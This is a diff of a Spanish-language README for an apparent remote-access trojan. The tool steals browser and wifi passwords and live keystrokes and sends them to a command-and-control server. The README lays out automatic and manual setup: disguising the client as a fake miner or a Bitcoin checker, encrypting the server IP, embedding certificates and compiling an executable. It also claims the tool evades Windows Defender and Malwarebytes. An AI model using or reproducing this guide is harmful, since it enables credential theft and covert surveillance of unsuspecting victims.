@@ -20,7 +20,7 @@ Features:
                3. Contraseñas en navegadores (edge/brave/google) (conex. cifrada) :5002
                4. Contraseñas wifi guardadas (conex. cifrada) :5002
 
-         Testeado con windows defender y malwarebytes, no da positivo! (02/09/2023)  
+         Testeado con windows defender y malwarebytes, no da positivo!   
 --- 
 # Explicaciones
         
@@ -68,15 +68,63 @@ Files:
 
       server/cmd_cntr.py       -->  Command & Control Server
       server/recv_cred.py      -->  Recive ALL passwords stealed
+      server/recv_keys.py      -->  Recive the keystrokes in real time
       server/server.py         -->  Main file to start the server listen
       server/certs.py          -->  Certs for cipher the comms
+---
+
+# Preparación (AUTOMÁTICA)
+### ADVETENCIA
+Para poder llevar a cabo la preparación automática, no se puede hacer modificado ni movido de sitio ninguno de los archivos
+del repositorio
+
+1. Ejecutamos el script **fstcmp.py**:
+
+        D:\FakeProyect> .\fstcmp.py
+
+2. Seleccionamos la 1a opción y elegimos una plantilla:
+    
+       [*] Template Selector
+          [1] Fake Miner
+
+          [2] Invisible
+
+          [3] Bitcoin account checker
+       Select [!>]
+
+3. Seleccionamos la 2da opción y dejamos que se ejecute correctamente 
+      
+       Select [!>] 2
+           [+] Creating Certs...
+           [+] Importing certs to client...
+           [+] Importing certs to server...
+       [*] DONE! 
+
+4. Seleccionamos la 4ta opción y especificamos si queremos que se requiera ser administrador:
+   
+       [!] Do you want to run as admintrator? [ (S) Default / n ] > n
+
+       [*] Compiling...  
+
+5. Ahora tendremos el .exe generado y funcionando, podemos abandonar el script o ejecutar el servidor
+
+             Select [!>] 5
+           [!] STARTED C&C SERVER
+
+       |[!] Listening on 5000||[!] Listening on 5002|
+
+       Ncat: Version 7.94 ( https://nmap.org/ncat )
+       Ncat: Listening on [::]:5001
+       Ncat: Listening on 0.0.0.0:5001
+
+RUTA -> ./dist/{template}.exe
+
 
 ---
 # Preapración (MANUAL)
 
 ### Escoger modo de ataque
-    
-    Lo primero de todo elegimos una plantilla de las siguientes:
+1. Elegimos una de las siguientes plantillas:
 
         1. Fake Miner (client/main.py)
             └─ Trata de hacer creer que el usuario está minando.
@@ -92,64 +140,67 @@ Files:
 Recurso ---> https://cyberchef.org/
 
 ---         
-      1. Ejecutamos el create_certs.py, nos dará de resultado 2 archivos
-         key.pem y cert.pem
+1. Ejecutamos el create_certs.py, nos dará de resultado 2 archivos
 
-      ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
-      └─$ python3 create_certs.py
+         ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
+         └─$ python3 create_certs.py
 
-      ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
-      └─$ ls
-      client  create_certs.py  img  __pycache__  README.md  requirements.txt  server
+         ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
+         └─$ ls
+         client  server  [ [cert.pem]  [key.pem] ] create_certs.py  README.md  requirements.txt  
 ---
-     2. Estos archivos los encodeamos en base64  
-        certs.py (client/server)   
+2. Estos archivos los encodeamos en base64certs.py (client/server)   
+   (Para autocopiar el resultado instalamos xclip ) 
 
-      ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
-      └─$ sudo apt install xclip && cat key.pem | base64 | xclip -sel clip
+        $ sudo apt install xclip -y
+        ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
+        └─$ cat key.pem | base64 | xclip -sel clip
 
-      ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
-      └─$ cat cert.pem | base64 | xclip -sel clip
+        ┌──(pablo㉿DESKTOP-IJHJ6PM)-[/mnt/d/ProtectosPython/ETHICAL_HACKING/fake_miner/FakeProyect]
+        └─$ cat cert.pem | base64 | xclip -sel clip
 
 
 ---
-      3. Los pegamos en los archivos
+3. Los pegamos en los archivos (server/certs.py && client/certs.py)
+
          Funcion crte == cert.pem
          Funcion locker == key.pem
 
    ![img_1.png](img/img_1.png)
 
 
-### 1. Preparar IP
+### Preparar IP
 
-      Nos dirigimos a la carpeta client y debemos especificar la direccion IP
-
-      En los archivos "find_interest.py", "get_points.py" y main.py" tenemos una
-      función llamada "know_gme()"
-         
-      En esta funcion debemos especificar la direccion IP. Ahora tenemos dos opciones:
+  En la carpeta client debemos especificar la direccion IP En los siguientes archivos:
+  
+      "find_interest.py", "get_points.py" y main.py"
+Hay una función llamada "know_gme()". 
+  
+En esta funcion debemos especificar la direccion IP. Ahora tenemos dos opciones:
     
-         i. Encritpar IP:
+1.  Encritpar IP:
          
             Ejecutamos el archivo "client/CryptoPhenix" nos pedira una IP.
          
             La parte que nos interesa es la de RESULT, que es la IP encriptada completa
-   ![img_3.png](img/img_3.png)
+![img_3.png](img/img_3.png)
             
-    ii. IP sin encriptar
+2. IP sin encriptar
 
-            Simplemente escribimos la IP como veremos en el siguiente punto
+         Simplemente escribimos la IP como veremos en el siguiente punto
    
-### 2. Escribimos IP:
+### Escribimos IP:
 
-         Abrimos los archivos y modificamos la funcion, si hemos encriptado la IP
-         Pegamos el resultado en "unkown"
-   ![img_4.png](img/img_4.png)
+1. Abrimos los archivos y modificamos la funcion.
+
+   si hemos encriptado la IP Pegamos el resultado en "unkown"
+
+![img_4.png](img/img_4.png)
          
-         Por otra parte, si no, solamente hacemos un return de la IP:
+2. Por otra parte, si no, solamente hacemos un return de la IP:
 
 
-   ![img_5.png](img/img_5.png)
+![img_5.png](img/img_5.png)
       
 
 ### 3. Preapramos servidor
@@ -161,7 +212,7 @@ Recurso ---> https://cyberchef.org/
 ---
       Si ejecutamos el archivo server/server.py, el servidor estará montado y bien preparado
       
-      Si ejecutamos el archivo principal client/keylog_command.py deberiamos de recibir todas las 
+      Si ejecutamos el archivo principal client/main.py deberiamos de recibir todas las 
       conexiones!
 
       En el caso de que no nos funcione, tenemos que generar unos certificados nuevos 
@@ -188,7 +239,7 @@ Recurso ---> https://cyberchef.org/
 
 # Proximamente!
 
-#### Preparacion Automática
+#### Persistencia
 
 
 
